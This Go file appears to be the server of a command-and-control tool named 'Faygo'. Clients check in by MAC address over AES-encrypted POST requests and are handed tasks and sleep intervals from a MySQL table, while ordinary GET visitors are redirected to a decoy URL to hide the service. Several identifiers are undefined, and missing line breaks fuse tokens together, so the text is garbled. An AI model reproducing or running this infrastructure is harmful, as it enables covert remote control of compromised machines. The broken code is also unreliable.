package mainimport (
	"Faygo/server/module/cipher"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"time"	"github.com/gin-gonic/gin"
	"gorm.io/driver/mysql"
	"gorm.io/gorm"
)var db *gorm.DB
var sqlerr errorfunc init() {	db, sqlerr = gorm.Open(mysql.Open(dsn), &gorm.Config{})
	if sqlerr != nil {
		panic(sqlerr)
	}}func StartHttpServer() {
	router := gin.Default()
	router.GET("/", HttpGet)
	router.POST("/", HttpPost)
	router.Run(":5000")
}
func HttpGet(c *gin.Context) {
	
	c.Redirect(302, redirecturl)
}
func HttpPost(c *gin.Context) {
	body, err := ioutil.ReadAll(c.Request.Body)
	
	if err != nil {
		c.JSON(http.StatusOK, gin.H{
			"error": err,
		})
	} else {
		posttask := Task{}
		posttask.Json2Struct(AesDeCode(string(body)))
		if posttask.Mac == "" {
			c.Redirect(302, redirecturl)		} else {
			posttask.UpdataTime() 
			response := DealRequests(string(body))
			
			fmt.Println("response:", response)
			c.String(http.StatusOK, response)
		}	}
}func AesEnCode(str string) string {
	bytestr := []byte(str)
	cryptstr, err := cipher.AesCbcEncrypt(bytestr, []byte(AesKey))
	if err != nil {
		fmt.Println(err)
	}
	return base64.StdEncoding.EncodeToString(cryptstr)
}func AesDeCode(str string) string {
	bytestr, _ := base64.StdEncoding.DecodeString(str)
	
	decryptstr, err := cipher.AesCbcDecrypt(bytestr, []byte(AesKey))
	if err != nil {
		fmt.Println(err)
	}
	return string(decryptstr)
}func Struct2Json(clientstruct interface{}) string {
	json, _ := json.Marshal(clientstruct) 
	return string(json)
}func (client *Client) Json2Struct(clientjson string) {
	jsontmp := string(clientjson)
	json.Unmarshal([]byte(jsontmp), client)
}func (task *Task) Json2Struct(clientjson string) {
	jsontmp := string(clientjson)
	json.Unmarshal([]byte(jsontmp), task)
}func InitClient(client Client) bool {
	client.Sleep = defaultsleep 
	client.Status = 1           
	result := db.Table("client").Create(&client)
	if sqlerr != nil {
		fmt.Println(result)
		return false
	} else {
		return true
	}}func (task *Task) GetTask() {
	db.Table("client").Where("mac = ?", task.Mac).Find(&task)}func (task *Task) UpdataTask() {
	
	task.Status = 1
	
	db.Table("client").Model(&Task{}).Where("mac = ?", task.Mac).Omit("mac", "task").Updates(task) }func (task *Task) UpdataTime() {
	tasktime := TaskTime{Mac: task.Mac, LatestTime: GetTime()}	
	db.Table("client").Model(&TaskTime{}).Where("mac = ?", tasktime.Mac).Updates(tasktime)}
func GetTime() string {
	return time.Now().Format("2006-01-02 15:04:05")
}
